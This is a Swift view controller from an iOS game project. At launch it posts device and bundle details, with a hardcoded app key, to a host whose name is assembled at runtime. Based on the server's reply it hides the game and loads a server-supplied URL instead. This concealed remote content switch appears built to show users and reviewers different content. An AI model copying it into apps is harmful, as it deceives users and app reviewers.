//
//  ViewController.swift
//  RabbitTacticsArena
//
//  Created by jin fu on 2024/12/16.
//

import UIKit

class RabbitStartController: UIViewController {

    @IBOutlet weak var stackView: UIStackView!
    
    @IBOutlet weak var playView: UIView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        // Do any additional setup after loading the view.
        
        if UIScreen.main.bounds.size.width > UIScreen.main.bounds.size.height {
            self.handleLandscapeLayout()
        } else {
            self.handlePortraitLayout()
        }
        
        WhisperPostaForAdsDataNeedNotificationPermission()
        self.WhisperStartAdsLocalData()
    }

    override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) {
        super.viewWillTransition(to: size, with: coordinator)
        
        coordinator.animate(alongsideTransition: { _ in
            if UIDevice.current.orientation.isLandscape {
                print("当前为横屏")
                self.handleLandscapeLayout()
            } else if UIDevice.current.orientation.isPortrait {
                print("当前为竖屏")
                self.handlePortraitLayout()
            }
        })
    }
    
    func handleLandscapeLayout() {
        // 处理横屏时的布局或逻辑
        self.stackView.axis = .horizontal
    }
    
    func handlePortraitLayout() {
        // 处理竖屏时的布局或逻辑
        self.stackView.axis = .vertical
    }

    private func WhisperStartAdsLocalData() {
        guard self.whisper_NeedShowAdsView() else {
            return
        }
        self.playView.isHidden = true
        WhisperPostaForAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.whisper_setUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.whisper_ShowAdView(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.whisper_ShowAdView(adsUr)
                    }
                    return
                }
            }
            self.playView.isHidden = false
        }
    }
    
    private func WhisperPostaForAdsData(completion: @escaping ([Any]?) -> Void) {
        guard let bundleId = Bundle.main.bundleIdentifier else {
            completion(nil)
            return
        }
        
        let url = URL(string: "https://open.cl\(self.whisper_HostUrl())/open/WhisperPostaForAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appLocalized": UIDevice.current.localizedModel ,
            "appKey": "3b0e34fffcf149a5822caca405247dd7",
            "appPackageId": bundleId,
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? ""
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }
}

extension RabbitStartController: UNUserNotificationCenterDelegate {
    func WhisperPostaForAdsDataNeedNotificationPermission() {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
          options: authOptions,
          completionHandler: { _, _ in }
        )
        UIApplication.shared.registerForRemoteNotifications()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print(userInfo)
        completionHandler([[.sound]])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print(userInfo)
        completionHandler()
    }
}
